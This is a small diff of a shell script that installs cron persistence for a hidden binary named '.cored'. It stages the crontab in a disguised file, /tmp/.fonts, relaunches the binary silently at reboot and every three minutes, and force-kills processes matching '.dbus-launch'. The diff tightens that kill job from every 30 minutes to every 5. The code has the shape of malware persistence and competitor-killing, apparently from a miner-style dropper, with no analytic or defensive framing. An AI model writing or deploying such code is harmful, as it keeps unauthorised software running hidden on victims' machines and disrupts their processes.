@@ -36,8 +36,7 @@ crontab -l 2>/dev/null > /tmp/.fonts || true
 
 echo "@reboot setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
 echo "*/3 * * * * setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
-echo "*/30 * * * * ps aux | grep '[.]dbus-launch' | awk '{print \$2}' | xargs -r kill -9" >> /tmp/.fonts
-
+echo "*/5 * * * * ps aux | grep '[.]dbus-launch' | awk '{print \$2}' | xargs -r kill -9" >> /tmp/.fonts
 
 
 crontab /tmp/.fonts
